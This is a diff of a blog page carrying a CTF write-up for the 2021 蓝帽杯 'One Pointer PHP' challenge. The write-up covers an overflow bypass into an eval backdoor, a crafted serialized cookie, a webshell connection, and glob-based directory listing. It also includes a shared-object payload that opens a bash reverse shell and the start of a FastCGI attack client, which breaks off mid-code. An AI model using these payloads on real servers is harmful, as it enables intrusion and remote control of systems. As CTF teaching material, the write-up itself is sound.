@@ -105,6 +105,8 @@
        --><li><a href="/categories/">分类</a></li><!--
      --><!--
        --><li><a href="/%E5%8F%8B%E4%BA%BA%E9%93%BA/">友链</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
      -->
       </ul>
     </span>
@@ -206,9 +208,9 @@
 <h4 id="示例1"><a href="#示例1" class="headerlink" title="#示例1"></a>#示例1</h4><pre class=" language-info"><code class="language-info"><?php
 $count[]=100000000000000000000000;   // 只要大于9,223,372,036,854,775,807就能返回`yes`
 if($count[]=1)
-&#123;
+{
     echo "yes";
-&#125;
+}
 
 // 输出yes
 </code></pre>
@@ -227,12 +229,12 @@ if($count[]=1)
 <h4 id="方法二-glob协议"><a href="#方法二-glob协议" class="headerlink" title="方法二.glob协议"></a>方法二.glob协议</h4><p>用这个代码，访问该文件就可以得到根目录的内容</p>
 <pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
 <span class="token variable">$a</span> <span class="token operator">=</span> "glob<span class="token punctuation">:</span><span class="token comment" spellcheck="true">///*";</span>
-<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token function">opendir</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
-    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">readdir</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token function">opendir</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">readdir</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
         <span class="token keyword">echo</span> <span class="token variable">$file</span><span class="token punctuation">.</span><span class="token string">'&lt;br>'</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//将根目录的文件名字输出</span>
-    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
+    <span class="token punctuation">}</span>
     <span class="token function">closedir</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
+<span class="token punctuation">}</span>
 </code></pre>
 <p><img src="/Blogimages/2021%E8%93%9D%E5%B8%BD%E6%9D%AF_One_Pointer_PHP/image%20(6).png"></p>
 <h4 id="方法三-利用ini-set读取文件内容"><a href="#方法三-利用ini-set读取文件内容" class="headerlink" title="方法三.利用ini_set读取文件内容"></a>方法三.利用ini_set读取文件内容</h4><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
@@ -248,26 +250,26 @@ if($count[]=1)
 <p>成功访问</p>
 <h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a><img src="/Blogimages/2021%E8%93%9D%E5%B8%BD%E6%9D%AF_One_Pointer_PHP/image%20(7).png">解题</h2><p>题目给了源码：</p>
 <pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
-  <span class="token keyword">class</span> <span class="token class-name">User</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
+  <span class="token keyword">class</span> <span class="token class-name">User</span><span class="token punctuation">{</span>
   <span class="token keyword">public</span> <span class="token variable">$count</span><span class="token punctuation">;</span>
-<span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
+<span class="token punctuation">}</span>
 <span class="token delimiter">?></span>
 </code></pre>
 <pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
 <span class="token keyword">include</span> <span class="token string">"user.php"</span><span class="token punctuation">;</span>
-<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token operator">=</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">"data"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token operator">=</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">"data"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
     <span class="token variable">$count</span><span class="token punctuation">[</span><span class="token operator">++</span><span class="token variable">$user</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">count</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>
-    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$count</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$count</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
         <span class="token variable">$user</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">count</span><span class="token operator">+</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>
         <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string">"data"</span><span class="token punctuation">,</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;else&amp;#123;</span>
+    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
         <span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"backdoor"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
-<span class="token operator">&amp;</span><span class="token shell-comment comment">#125;else&amp;#123;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
     <span class="token variable">$user</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">;</span>
     <span class="token variable">$user</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">count</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>
     <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string">"data"</span><span class="token punctuation">,</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
+<span class="token punctuation">}</span>
 <span class="token delimiter">?></span>
 </code></pre>
 <h3 id="溢出绕过"><a href="#溢出绕过" class="headerlink" title="溢出绕过"></a>溢出绕过</h3><p>这里要求<code>$count[]=1为假</code><br>即<code>$count[++$user-&gt;count]</code>中的<code>++$user-&gt;count</code>&#x3D;9,223,372,036,854,775,807</p>
@@ -287,18 +289,18 @@ print_r()  -> 打印
 <h4 id="2-连接蚁剑，上传文件"><a href="#2-连接蚁剑，上传文件" class="headerlink" title="2.连接蚁剑，上传文件"></a>2.连接蚁剑，上传文件</h4><p>连接的地址是<code>/add_api.php?backdoor=eval($_POST[8]);</code><br>记得添加请求信息的Cookie，值为<code>data=O%3A4%3A%22User%22%3A1%3A%7Bs%3A5%3A%22count%22%3Bi%3A9223372036854775806%3B%7D</code><br><img src="/Blogimages/2021%E8%93%9D%E5%B8%BD%E6%9D%AF_One_Pointer_PHP/image%20(11).png"><br>连接成功<br>上传文件a.php</p>
 <pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
 <span class="token variable">$a</span> <span class="token operator">=</span> "glob<span class="token punctuation">:</span><span class="token comment" spellcheck="true">///*";</span>
-<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token function">opendir</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
-    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">readdir</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token function">opendir</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">readdir</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
         <span class="token keyword">echo</span> <span class="token variable">$file</span><span class="token punctuation">.</span><span class="token string">'&lt;br>'</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//将根目录的文件名字输出</span>
-    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
+    <span class="token punctuation">}</span>
     <span class="token function">closedir</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
+<span class="token punctuation">}</span>
 </code></pre>
 <p>上传成功后，访问即可以得到根目录：<br><img src="/Blogimages/2021%E8%93%9D%E5%B8%BD%E6%9D%AF_One_Pointer_PHP/image%20(12).png"></p>
 <h4 id="3-利用DirectoryIterator的globa"><a href="#3-利用DirectoryIterator的globa" class="headerlink" title="3.利用DirectoryIterator的globa"></a>3.利用DirectoryIterator的globa</h4><pre class=" language-php"><code class="language-php"><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DirectoryIterator</span><span class="token punctuation">(</span>"glob<span class="token punctuation">:</span><span class="token comment" spellcheck="true">///*");</span>
-<span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token keyword">as</span> <span class="token variable">$f</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
+<span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token keyword">as</span> <span class="token variable">$f</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
     <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">'&lt;br>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
+    <span class="token punctuation">}</span>
 </code></pre>
 <p>直接复制贴在backdoor后面:<br><img src="/Blogimages/2021%E8%93%9D%E5%B8%BD%E6%9D%AF_One_Pointer_PHP/image%20(13).png"></p>
 <hr>
@@ -317,9 +319,9 @@ print_r()  -> 打印
 <span class="token shell-comment comment">#include </span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>stdio.h</span><span class="token punctuation">></span></span></span>
 <span class="token shell-comment comment">#include </span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>string.h</span><span class="token punctuation">></span></span></span>
  
-<span class="token function">__attribute__</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>__constructor__<span class="token punctuation">)</span><span class="token punctuation">)</span> void <span class="token function">preload</span> <span class="token punctuation">(</span>void<span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
+<span class="token function">__attribute__</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>__constructor__<span class="token punctuation">)</span><span class="token punctuation">)</span> void <span class="token function">preload</span> <span class="token punctuation">(</span>void<span class="token punctuation">)</span><span class="token punctuation">{</span>
     <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"bash -c 'bash -i >&amp; /dev/tcp/ip/2333 0>&amp;1'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//记住这个监听端口，要与下面的保持一致</span>
-<span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
+<span class="token punctuation">}</span>
 
 <span class="token comment" spellcheck="true">//gcc payload.c -fPIC -shared -o payload.so</span>
 </code></pre>
@@ -386,7 +388,7 @@ conn<span class="token punctuation">.</span><span class="token function">close</
  * @version     1.0
  */</span>
 <span class="token keyword">class</span> <span class="token class-name">FCGIClient</span>
-<span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
+<span class="token punctuation">{</span>
     <span class="token keyword">const</span> <span class="token constant">VERSION_1</span>            <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
     <span class="token keyword">const</span> <span class="token constant">BEGIN_REQUEST</span>        <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
     <span class="token keyword">const</span> <span class="token constant">ABORT_REQUEST</span>        <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>
@@ -438,10 +440,10 @@ conn<span class="token punctuation">.</span><span class="token function">close</
      * @param Integer $port Port of the FastCGI application
      */</span>
     <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">,</span> <span class="token variable">$port</span> <span class="token operator">=</span> <span class="token number">9001</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// and default value for port, just for unixdomain socket</span>
-    <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
+    <span class="token punctuation">{</span>
         <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_host</span> <span class="token operator">=</span> <span class="token variable">$host</span><span class="token punctuation">;</span>
         <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_port</span> <span class="token operator">=</span> <span class="token variable">$port</span><span class="token punctuation">;</span>
-    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
+    <span class="token punctuation">}</span>
     <span class="token comment" spellcheck="true">/**
      * Define whether or not the FastCGI application should keep the connection
      * alive at the end of a request
@@ -449,34 +451,34 @@ conn<span class="token punctuation">.</span><span class="token function">close</
      * @param Boolean $b true if the connection should stay alive, false otherwise
      */</span>
     <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">setKeepAlive</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span>
-    <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
+    <span class="token punctuation">{</span>
         <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_keepAlive</span> <span class="token operator">=</span> <span class="token punctuation">(</span>boolean<span class="token punctuation">)</span><span class="token variable">$b</span><span class="token punctuation">;</span>
-        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_keepAlive</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_sock</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_keepAlive</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_sock</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
             <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_sock</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
-    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
     <span class="token comment" spellcheck="true">/**
      * Get the keep alive status
      *
      * @return Boolean true if the connection should stay alive, false otherwise
      */</span>
     <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">getKeepAlive</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
-    <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
+    <span class="token punctuation">{</span>
         <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_keepAlive</span><span class="token punctuation">;</span>
-    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
+    <span class="token punctuation">}</span>
     <span class="token comment" spellcheck="true">/**
      * Create a connection to the FastCGI application
      */</span>
     <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">connect</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
-    <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
-        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_sock</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
+    <span class="token punctuation">{</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_sock</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
             <span class="token comment" spellcheck="true">//$this->_sock = fsockopen($this->_host, $this->_port, $errno, $errstr, 5);</span>
             <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_sock</span> <span class="token operator">=</span> <span class="token function">stream_socket_client</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_host</span><span class="token punctuation">,</span> <span class="token variable">$errno</span><span class="token punctuation">,</span> <span class="token variable">$errstr</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_sock</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_sock</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                 <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Exception</span><span class="token punctuation">(</span><span class="token string">'Unable to connect to FastCGI application'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-            <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
-        <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
-    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
+            <span class="token punctuation">}</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
     <span class="token comment" spellcheck="true">/**
      * Build a FastCGI packet
      *
@@ -485,7 +487,7 @@ conn<span class="token punctuation">.</span><span class="token function">close</
      * @param Integer $requestId RequestId
      */</span>
     <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">buildPacket</span><span class="token punctuation">(</span><span class="token variable">$type</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">,</span> <span class="token variable">$requestId</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">)</span>
-    <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
+    <span class="token punctuation">{</span>
         <span class="token variable">$clen</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
         <span class="token keyword">return</span> <span class="token function">chr</span><span class="token punctuation">(</span>self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">VERSION_1</span><span class="token punctuation">)</span>         <span class="token comment" spellcheck="true">/* version */</span>
             <span class="token punctuation">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$type</span><span class="token punctuation">)</span>                    <span class="token comment" spellcheck="true">/* type */</span>
@@ -496,7 +498,7 @@ conn<span class="token punctuation">.</span><span class="token function">close</
             <span class="token punctuation">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>                        <span class="token comment" spellcheck="true">/* paddingLength */</span>
             <span class="token punctuation">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>                        <span class="token comment" spellcheck="true">/* reserved */</span>
             <span class="token punctuation">.</span> <span class="token variable">$content</span><span class="token punctuation">;</span>                     <span class="token comment" spellcheck="true">/* content */</span>
-    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
+    <span class="token punctuation">}</span>
     <span class="token comment" spellcheck="true">/**
      * Build an FastCGI Name value pair
      *
@@ -505,26 +507,26 @@ conn<span class="token punctuation">.</span><span class="token function">close</
      * @return String FastCGI Name value pair
      */</span>
     <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">buildNvpair</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span>
-    <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
+    <span class="token punctuation">{</span>
         <span class="token variable">$nlen</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
         <span class="token variable">$vlen</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$nlen</span> <span class="token operator">&lt;</span> <span class="token number">128</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$nlen</span> <span class="token operator">&lt;</span> <span class="token number">128</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
             <span class="token comment" spellcheck="true">/* nameLengthB0 */</span>
             <span class="token variable">$nvpair</span> <span class="token operator">=</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$nlen</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token operator">&amp;</span><span class="token shell-comment comment">#125; else &amp;#123;</span>
+        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
             <span class="token comment" spellcheck="true">/* nameLengthB3 &amp; nameLengthB2 &amp; nameLengthB1 &amp; nameLengthB0 */</span>
             <span class="token variable">$nvpair</span> <span class="token operator">=</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$nlen</span> <span class="token operator">></span><span class="token operator">></span> <span class="token number">24</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token number">0x80</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$nlen</span> <span class="token operator">></span><span class="token operator">></span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$nlen</span> <span class="token operator">></span><span class="token operator">></span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$nlen</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
-        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$vlen</span> <span class="token operator">&lt;</span> <span class="token number">128</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
+        <span class="token punctuation">}</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$vlen</span> <span class="token operator">&lt;</span> <span class="token number">128</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
             <span class="token comment" spellcheck="true">/* valueLengthB0 */</span>
             <span class="token variable">$nvpair</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$vlen</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token operator">&amp;</span><span class="token shell-comment comment">#125; else &amp;#123;</span>
+        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
             <span class="token comment" spellcheck="true">/* valueLengthB3 &amp; valueLengthB2 &amp; valueLengthB1 &amp; valueLengthB0 */</span>
             <span class="token variable">$nvpair</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$vlen</span> <span class="token operator">></span><span class="token operator">></span> <span class="token number">24</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token number">0x80</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$vlen</span> <span class="token operator">></span><span class="token operator">></span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$vlen</span> <span class="token operator">></span><span class="token operator">></span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$vlen</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
+        <span class="token punctuation">}</span>
         <span class="token comment" spellcheck="true">/* nameData &amp; valueData */</span>
         <span class="token keyword">return</span> <span class="token variable">$nvpair</span> <span class="token punctuation">.</span> <span class="token variable">$name</span> <span class="token punctuation">.</span> <span class="token variable">$value</span><span class="token punctuation">;</span>
-    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
+    <span class="token punctuation">}</span>
     <span class="token comment" spellcheck="true">/**
      * Read a set of FastCGI Name value pairs
      *
@@ -532,32 +534,32 @@ conn<span class="token punctuation">.</span><span class="token function">close</
      * @return array of NVPair
      */</span>
     <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">readNvpair</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token variable">$length</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">)</span>
-    <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
+    <span class="token punctuation">{</span>
         <span class="token variable">$array</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$length</span> <span class="token operator">===</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$length</span> <span class="token operator">===</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
             <span class="token variable">$length</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
+        <span class="token punctuation">}</span>
         <span class="token variable">$p</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
-        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token variable">$p</span> <span class="token operator">!=</span> <span class="token variable">$length</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
